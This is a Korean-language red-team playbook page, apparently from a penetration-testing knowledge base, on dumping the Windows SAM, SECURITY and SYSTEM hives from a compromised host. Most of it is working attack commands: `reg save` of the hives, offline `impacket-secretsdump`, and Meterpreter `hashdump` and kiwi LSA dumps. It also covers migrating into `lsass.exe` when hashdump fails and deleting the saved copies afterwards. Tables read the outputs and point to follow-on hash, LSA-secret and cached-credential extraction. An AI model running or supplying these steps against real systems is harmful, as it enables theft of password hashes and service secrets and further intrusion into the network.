---
tags:
  - 환경/windows
문서역할: 오케스트레이터
시작조건: ["대상 Windows 호스트의 로컬 관리자 또는 SYSTEM 세션, 또는 오프라인 hive 세트 접근 확보"]
필요권한: ["대상 Windows 호스트의 로컬 관리자 또는 SYSTEM", "오프라인 SAM·SECURITY·SYSTEM 파일 읽기 권한"]
필요조건: ["원격 SMB 관리 경로 또는 명령 실행 세션", "hive 파일을 저장할 경로"]
결과: ["같은 Windows 설치와 시점의 SAM·SECURITY·SYSTEM hive 세트", "산출물별 추출 기법 선택 상태"]
---

# Windows SAM SECURITY SYSTEM 덤프

## 한 줄 판단

대상 Windows 호스트의 로컬 관리자·SYSTEM 세션이나 hive 읽기 권한이 있으면 같은 설치와 시점의 SAM·SECURITY·SYSTEM을 확보하고 필요한 자격 증명 종류별 추출 기법으로 넘긴다.

## 사용할 때

- 현재 보유 정보: 대상 Windows 호스트의 상승된 세션, 원격 관리자급 SMB 작업 권한 또는 디스크·백업·VSS의 hive 접근을 확보했다.
- 명령 실행 위치와 도달성: 대상 호스트의 상승된 `cmd`에서 hive를 저장하거나 분석 호스트에서 오프라인 hive 세트를 읽을 수 있다.
- 현재 가능한 행동과 결과: hive 파일을 확보할 수 있으며, 로컬 SAM hash·LSA secret·cached domain credential은 각각 별도 문서에서 추출하고 해석한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 로컬 저장은 대상의 상승된 셸, 오프라인 추출은 분석 호스트에 hive 존재 | 현재 호스트·세션과 파일 경로 확인 | 현재 접근에 맞는 로컬·원격·오프라인 경로 선택 |
| 현재 계정 또는 인증 수단 | 현재 세션 또는 원격 SMB 요청자 계정이 식별됨 | `whoami`, `netexec smb` 인증 주체 확인 | 도메인 인증 성공과 대상 로컬 관리자 권한 분리 확인 |
| 현재 권한 | 대상 호스트의 로컬 관리자·SYSTEM 또는 세 hive 읽기 권한 | 상승 토큰, 파일 ACL과 `reg save` 결과 확인 | UAC로 필터링되지 않은 토큰, SYSTEM 또는 오프라인 파일 권한 확인 |
| 공격 대상의 조건 | 같은 Windows 설치의 세 hive를 같은 시점에서 확보 가능 | 세 파일 출처와 저장 시각 확인 | 누락된 hive와 서로 다른 백업 시점 여부 확인 |

## 실행

### Windows 대상 호스트에서 hive 저장

기존 파일을 덮어쓰지 않도록 세 경로가 모두 없는 것을 먼저 확인한다. 하나라도 `EXISTS`가 출력되면 기존 파일을 지우거나 `/y`로 덮어쓰지 말고 이번 실행에만 사용할 다른 경로를 정한다.

```cmd
if exist "<SAM_HIVE_PATH>" echo EXISTS
if exist "<SYSTEM_HIVE_PATH>" echo EXISTS
if exist "<SECURITY_HIVE_PATH>" echo EXISTS
reg save HKLM\SAM "<SAM_HIVE_PATH>"
reg save HKLM\SYSTEM "<SYSTEM_HIVE_PATH>"
reg save HKLM\SECURITY "<SECURITY_HIVE_PATH>"
dir "<SAM_HIVE_PATH>" "<SYSTEM_HIVE_PATH>" "<SECURITY_HIVE_PATH>"
```

확인할 출력:

- 각 명령의 `The operation completed successfully`와 실제 생성된 세 파일.
- `Access is denied`가 나오면 계정 이름만 보지 말고 상승된 토큰 또는 SYSTEM 권한인지 확인한다.

### Linux 분석 호스트에서 세 hive 일괄 확인

```bash
impacket-secretsdump -sam '<LOCAL_SAM_HIVE>' -security '<LOCAL_SECURITY_HIVE>' -system '<LOCAL_SYSTEM_HIVE>' LOCAL
```

이 명령은 세 종류의 결과를 한 번에 출력한다. `Dumping local SAM hashes`, `Dumping LSA Secrets`, cached domain logon을 각각 아래 세부 기법으로 나눠 해석한다.

### Windows Meterpreter 세션에서 직접 추출

현재 Meterpreter 세션이 대상 Windows 호스트의 로컬 관리자 또는 SYSTEM 권한으로 실행 중이면 로컬 SAM hash와 LSA secret을 직접 확인할 수 있다.

```text
meterpreter > getuid
meterpreter > getprivs
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

확인할 출력:

- `hashdump`의 `<USER>:<RID>:<LM_HASH>:<NT_HASH>:::` 형식은 대상 호스트의 로컬 SAM 계정 hash다.
- `lsa_dump_sam`의 `Running as SYSTEM`과 SAM 항목, `lsa_dump_secrets`의 LSA secret 항목을 서로 다른 산출물로 구분한다.
- `lsa_dump_sam` 또는 `lsa_dump_secrets`가 kiwi 확장을 요구하면 `load kiwi` 성공을 먼저 확인한다. `Loaded x86 Kiwi on an x64 architecture` 경고가 나오면 세션과 대상 프로세스 architecture를 맞춘 뒤 결과를 다시 확인한다.
- `hashdump`가 `Operation failed: Incorrect function`으로 실패하면 현재 권한과 세션 architecture를 확인한다. SYSTEM 세션에서 x64 `lsass.exe`가 확인되는 경우 해당 PID로 이동한 뒤 다시 시도할 수 있다.

```text
meterpreter > getuid
meterpreter > ps | grep lsass
meterpreter > migrate <LSASS_PID>
meterpreter > getpid
meterpreter > getuid
meterpreter > hashdump
```

`Migration completed successfully`만으로 완료하지 않는다. 이동 뒤 `getuid`가 `NT AUTHORITY\\SYSTEM`으로 유지되고, `hashdump`가 `<USER>:<RID>:<LM_HASH>:<NT_HASH>:::` 형식을 출력해야 로컬 SAM hash 획득으로 판단한다. 자세한 이동 판단은 [[Meterpreter 프로세스 이동과 세션 안정화]]에서 확인한다.

### 산출물별 다음 기법 선택

| 필요한 결과 | 사용할 hive | 다음 기법 |
|---|---|---|
| 로컬 계정 NTLM hash | SAM + SYSTEM | [[Windows SAM 로컬 계정 해시 추출]] |
| 서비스 계정 secret·DPAPI_SYSTEM | SECURITY + SYSTEM | [[Windows LSA Secrets 추출]] |
| 캐시된 도메인 로그인 DCC2 | SECURITY + SYSTEM | [[Windows Cached Domain Credentials 추출]] |

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| SAM·SECURITY·SYSTEM 세 파일 생성 | hive 획득 성공 | 오프라인 추출 입력 확보 | 필요한 산출물별 세부 기법 선택 |
| 한 hive만 누락 | 완전한 추출 입력이 아님 | 부분 파일만 확보 | 같은 대상·시점에서 누락 hive 재획득 |
| `Access is denied` | 상승된 토큰 또는 hive 읽기 권한 부족 | hive 미획득 | UAC, 현재 토큰과 SYSTEM 전환 확인 |

## 확인할 출력과 권한

- 세 파일의 대상 호스트, Windows 설치와 획득 시점이 같은지 확인한다.
- hive 파일 확보와 실제 hash·secret 추출은 다른 성공 단계다.
- 로컬 관리자 그룹 표시만으로 충분하지 않으며 상승된 토큰 또는 SYSTEM 수준의 hive 읽기 권한이 필요하다.

## 변경 영향과 복구

이 로컬 저장 방식이 만드는 상태는 대상 Windows의 `<SAM_HIVE_PATH>`·`<SYSTEM_HIVE_PATH>`·`<SECURITY_HIVE_PATH>`와 회수한 분석 호스트의 세 사본뿐이다. 생성 전에 부재를 확인한 exact 경로와 크기를 기록하고, 전송·추출이 끝나면 이번 실행이 만든 대상 사본만 제거한다.

```cmd
del /f "<SAM_HIVE_PATH>"
del /f "<SYSTEM_HIVE_PATH>"
del /f "<SECURITY_HIVE_PATH>"
if exist "<SAM_HIVE_PATH>" echo SAM_REMAINS
if exist "<SYSTEM_HIVE_PATH>" echo SYSTEM_REMAINS
if exist "<SECURITY_HIVE_PATH>" echo SECURITY_REMAINS
```

마지막 세 명령이 아무것도 출력하지 않아야 대상 임시 파일 정리가 확인된다. 삭제 실패 시 먼저 파일을 연 process, 현재 token의 삭제 권한과 방어 제품의 격리·잠금 상태를 확인한다. 분석 호스트 사본은 추출 결과와 함께 민감 자료 보존·폐기 정책에 따라 exact 경로만 처리한다. `reg save`는 registry 값을 변경하지 않으므로 hive를 `reg restore`할 대상이 아니다.

## 관련 도구

- [[impacket-secretsdump]]
- [[netexec]]
- [[mimikatz]]
- [[meterpreter]]

## 관련 공격기법

- Meterpreter 오류 뒤 프로세스 이동: [[Meterpreter 프로세스 이동과 세션 안정화]]
- 원격 SAM 추출: [[Windows SAM 로컬 계정 해시 추출]]
- 원격 LSA secret 추출: [[Windows LSA Secrets 추출]]
- cached domain logon 추출: [[Windows Cached Domain Credentials 추출]]

## 참고 링크

- [Microsoft Learn: reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)
